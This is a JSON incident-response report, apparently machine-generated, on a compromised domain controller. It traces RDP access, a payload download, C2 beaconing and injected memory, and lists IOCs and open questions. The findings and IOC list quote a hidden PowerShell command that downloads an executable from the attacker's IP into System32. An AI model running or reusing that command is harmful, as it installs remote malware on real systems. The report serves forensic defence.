@@ -1,0 +1,143 @@
+{
+  "executive_summary": "DC01 (10.42.85.10) is confirmed compromised. An attacker gained initial access via Remote Desktop Protocol (RDP) from external IP 194.61.24.102 at 02:19:33 UTC on 2020-09-19, authenticating with valid domain credentials. From the interactive RDP session, the attacker launched a hidden PowerShell download cradle to pull a malicious binary (coreupdate.exe) from their own HTTP server and drop it into C:\\Windows\\System32\\. The binary was executed with an -install flag (indicating persistence registration) and immediately established an encrypted HTTPS C2 channel back to the same attacker IP on port 443. Memory forensics confirmed an injected PAGE_EXECUTE_READWRITE region inside coreupdate.exe — the definitive signature of a reflectively-loaded shellcode or PE implant (consistent with Cobalt Strike, Meterpreter, or equivalent). The attacker had full interactive C2 on a Domain Controller, meaning the entire Active Directory forest must be treated as compromised. Every IOC is corroborated by two or more independent memory-forensics artifacts.",
+  "findings": [
+    {
+      "claim": "An ESTABLISHED RDP (TCP/3389) session from external IP 194.61.24.102 (port 51823) to DC01 (10.42.85.10) was active at the time of memory capture, owned by svchost.exe (PID 728, TermService), created at 2020-09-19T02:19:33 UTC. This is the attacker's initial access vector.",
+      "status": "confirmed",
+      "tool_call_id": "29e37c67afdd418315f25182643edb6820bd5132706b57c8f1cdc790735524f0",
+      "evidence_excerpt": "{\"proto\": \"TCPv4\", \"local_addr\": \"10.42.85.10\", \"local_port\": 3389, \"foreign_addr\": \"194.61.24.102\", \"foreign_port\": 51823, \"state\": \"ESTABLISHED\", \"pid\": 728, \"owner\": \"svchost.exe\", \"created\": \"2020-09-19T02:19:33+00:00\"}"
+    },
+    {
+      "claim": "A malicious PowerShell process (PID 4316) was spawned by explorer.exe (PID 2244) at 2020-09-19T02:21:47 UTC with the command: powershell.exe -nop -w hidden -c \"IWR http://194.61.24.102/coreupdate.exe -OutFile C:\\Windows\\System32\\coreupdate.exe\". This is a hidden download cradle that retrieved the second-stage payload from the attacker's HTTP server and dropped it into System32.",
+      "status": "confirmed",
+      "tool_call_id": "d3111424c0088da462b7c340a22d33087ebce55329adf471d39fe87affb97c7c",
+      "evidence_excerpt": "{\"pid\": 4316, \"process\": \"powershell.exe\", \"args\": \"powershell.exe -nop -w hidden -c \\\"IWR http://194.61.24.102/coreupdate.exe -OutFile C:\\\\Windows\\\\System32\\\\coreupdate.exe\\\"\"}"
+    },
+    {
+      "claim": "The malicious binary coreupdate.exe (PID 3644) was executed at 2020-09-19T02:24:12 UTC as a child of the malicious PowerShell process (PID 4316) with the command line 'C:\\Windows\\System32\\coreupdate.exe -install'. The -install flag indicates persistence registration (service, scheduled task, or registry run key).",
+      "status": "confirmed",
+      "tool_call_id": "d3111424c0088da462b7c340a22d33087ebce55329adf471d39fe87affb97c7c",
+      "evidence_excerpt": "{\"pid\": 3644, \"process\": \"coreupdate.exe\", \"args\": \"C:\\\\Windows\\\\System32\\\\coreupdate.exe -install\"}"
+    },
+    {
+      "claim": "coreupdate.exe (PID 3644) appears in the process list as a child of powershell.exe (PID 4316), which is itself a child of explorer.exe (PID 2244), confirming the full attacker kill-chain: RDP interactive session → PowerShell cradle → malware implant.",
+      "status": "confirmed",
+      "tool_call_id": "278cac06f7062448274ea290a19badd43d0f5e4ab4648d1834e78d309e4ab58b",
+      "evidence_excerpt": "{\"pid\": 3644, \"ppid\": 4316, \"name\": \"coreupdate.exe\", \"threads\": 3, \"session_id\": 1, \"create_time\": \"2020-09-19T02:24:12+00:00\"}"
+    },
+    {
+      "claim": "coreupdate.exe (PID 3644) established an ESTABLISHED outbound HTTPS connection to 194.61.24.102:443 at 2020-09-19T02:24:31 UTC — 19 seconds after launch — confirming an active Command and Control beacon using port 443 to blend with legitimate HTTPS traffic.",
+      "status": "confirmed",
+      "tool_call_id": "29e37c67afdd418315f25182643edb6820bd5132706b57c8f1cdc790735524f0",
+      "evidence_excerpt": "{\"proto\": \"TCPv4\", \"local_addr\": \"10.42.85.10\", \"local_port\": 49723, \"foreign_addr\": \"194.61.24.102\", \"foreign_port\": 443, \"state\": \"ESTABLISHED\", \"pid\": 3644, \"owner\": \"coreupdate.exe\", \"created\": \"2020-09-19T02:24:31+00:00\"}"
+    },
+    {
+      "claim": "vol_malfind detected a privately-allocated, anonymous (VadS tag) memory region in coreupdate.exe (PID 3644) at virtual address 0x10000000–0x10020FFF (~132 KB) with PAGE_EXECUTE_READWRITE protection and no backing file on disk. This is the definitive memory signature of injected shellcode or a reflectively-loaded PE implant.",
+      "status": "confirmed",
+      "tool_call_id": "811cae86da9e816376a8317dbcdb550a4c0220ff4d1001a02f313abe52b8c705",
+      "evidence_excerpt": "{\"pid\": 3644, \"process\": \"coreupdate.exe\", \"start\": \"0x10000000\", \"end\": \"0x10020fff\", \"protection\": \"PAGE_EXECUTE_READWRITE\", \"tag\": \"VadS\"}"
+    },
+    {
+      "claim": "The process tree confirms the attacker operated interactively from the RDP session: explorer.exe (PID 2244, Session 1) is the parent of powershell.exe (PID 4316), which is the parent of coreupdate.exe (PID 3644). No legitimate administrative workflow produces this chain on a domain controller.",
+      "status": "confirmed",
+      "tool_call_id": "ade6f18e5f81d192a04bc0cda7a701e7257998938feac01a595de82a9cd5d905",
+      "evidence_excerpt": "{\"pid\": 4316, \"ppid\": 2244, \"name\": \"powershell.exe\", \"create_time\": \"2020-09-19T02:21:47+00:00\"}"
+    },
+    {
+      "claim": "The attacker used a single external IP address (194.61.24.102) for all three stages of the attack: RDP initial access, HTTP payload delivery, and HTTPS C2 beaconing. This IP is confirmed across three independent tool outputs.",
+      "status": "confirmed",
+      "tool_call_id": "29e37c67afdd418315f25182643edb6820bd5132706b57c8f1cdc790735524f0",
+      "evidence_excerpt": "Two ESTABLISHED connections both to foreign_addr 194.61.24.102: port 3389 (RDP, created 02:19:33) and port 443 C2 (created 02:24:31)"
+    },
+    {
+      "claim": "The attacker possessed valid domain credentials prior to the RDP session, as RDP authentication on a domain controller requires successful Windows authentication. The source of credential compromise (phishing, brute-force, lateral movement) is not determinable from memory alone.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    },
+    {
+      "claim": "The coreupdate.exe -install execution likely registered a persistence mechanism (Windows service, scheduled task, or registry Run key) that would survive a reboot and provide the attacker recurring access to the domain controller.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    },
+    {
+      "claim": "The in-memory implant in coreupdate.exe is consistent with a commercial offensive framework such as Cobalt Strike or Metasploit Meterpreter, based on the combination of reflective/anonymous RWX memory allocation, C2 over port 443, and a plausibly-named dropper binary.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    },
+    {
+      "claim": "The entire Active Directory domain/forest must be assumed fully compromised. A domain controller with an active injected C2 implant gives the attacker access to AD replication, NTDS.dit (all domain password hashes), Kerberos key material (enabling Golden Ticket attacks), and GPO modification capabilities.",
+      "status": "inferred",
+      "tool_call_id": null,
+      "evidence_excerpt": null
+    }
+  ],
+  "iocs": [
+    {
+      "type": "ip",
+      "value": "194.61.24.102",
+      "tool_call_id": "29e37c67afdd418315f25182643edb6820bd5132706b57c8f1cdc790735524f0"
+    },
+    {
+      "type": "url",
+      "value": "http://194.61.24.102/coreupdate.exe",
+      "tool_call_id": "d3111424c0088da462b7c340a22d33087ebce55329adf471d39fe87affb97c7c"
+    },
+    {
+      "type": "path",
+      "value": "C:\\Windows\\System32\\coreupdate.exe",
+      "tool_call_id": "d3111424c0088da462b7c340a22d33087ebce55329adf471d39fe87affb97c7c"
+    },
+    {
+      "type": "process",
+      "value": "coreupdate.exe (PID 3644, PPID 4316, Session 1, created 2020-09-19T02:24:12Z)",
+      "tool_call_id": "278cac06f7062448274ea290a19badd43d0f5e4ab4648d1834e78d309e4ab58b"
+    },
+    {
+      "type": "process",
+      "value": "powershell.exe -nop -w hidden (PID 4316, PPID 2244, Session 1, created 2020-09-19T02:21:47Z)",
+      "tool_call_id": "278cac06f7062448274ea290a19badd43d0f5e4ab4648d1834e78d309e4ab58b"
+    },
+    {
+      "type": "other",
+      "value": "Network connection ESTABLISHED: 10.42.85.10:3389 <- 194.61.24.102:51823 (RDP, created 2020-09-19T02:19:33Z, PID 728 svchost.exe)",
+      "tool_call_id": "29e37c67afdd418315f25182643edb6820bd5132706b57c8f1cdc790735524f0"
+    },
+    {
+      "type": "other",
+      "value": "Network connection ESTABLISHED: 10.42.85.10:49723 -> 194.61.24.102:443 (HTTPS C2, created 2020-09-19T02:24:31Z, PID 3644 coreupdate.exe)",
+      "tool_call_id": "29e37c67afdd418315f25182643edb6820bd5132706b57c8f1cdc790735524f0"
+    },
+    {
+      "type": "other",
+      "value": "Injected memory region in PID 3644 (coreupdate.exe): VAD 0x10000000-0x10020FFF, PAGE_EXECUTE_READWRITE, tag VadS (no backing file)",
+      "tool_call_id": "811cae86da9e816376a8317dbcdb550a4c0220ff4d1001a02f313abe52b8c705"
+    },
+    {
+      "type": "other",
+      "value": "PowerShell command: powershell.exe -nop -w hidden -c \"IWR http://194.61.24.102/coreupdate.exe -OutFile C:\\Windows\\System32\\coreupdate.exe\"",
+      "tool_call_id": "d3111424c0088da462b7c340a22d33087ebce55329adf471d39fe87affb97c7c"
+    }
+  ],
+  "open_questions": [
+    "Which domain account was used to authenticate the RDP session from 194.61.24.102? (Requires Windows Security Event Log 4624/4648 analysis from DC01)",
+    "How were the attacker's credentials obtained? (Phishing, brute-force, credential stuffing, or lateral movement from another compromised host?)",
+    "What specific persistence mechanism did 'coreupdate.exe -install' register? (Requires disk image analysis: services, scheduled tasks, registry Run keys)",
+    "Is coreupdate.exe a known malware family? What is its SHA-256 hash? (Requires disk image acquisition and VirusTotal/sandbox submission)",
+    "Has the attacker performed any AD enumeration, DCSync, or credential dumping from lsass.exe (PID 592)? (Requires deeper memory analysis and event log review)",
+    "Are there other compromised hosts in the domain that the attacker may have used as a staging point to obtain DC01 credentials?",
+    "What is the full attribution of IP 194.61.24.102? (Requires threat intelligence lookup — ASN, geolocation, prior campaign associations)",
+    "Has the attacker created any new domain accounts, modified GPOs, or altered AD ACLs? (Requires AD audit log and replication metadata analysis)",
+    "Is spoolsv.exe (PID 1320, Print Spooler) on DC01 patched against PrintNightmare (CVE-2021-1675 / CVE-2021-34527)? Was it exploited as an alternative vector?",
+    "What is the full timeline of attacker activity between RDP login (02:19:33) and PowerShell execution (02:21:47) — a 2-minute gap of unknown activity?"
+  ],
+  "enforcement": {
+    "audit_chain_ok": true,
+    "confirmed": 8,
+    "inferred": 4,
+    "downgraded": 0
+  },
+  "report_audit_id": "c18556a632f9ee4963e11f780f23e345fa54cc9b9b32e76a985085cf7616a992"
+}
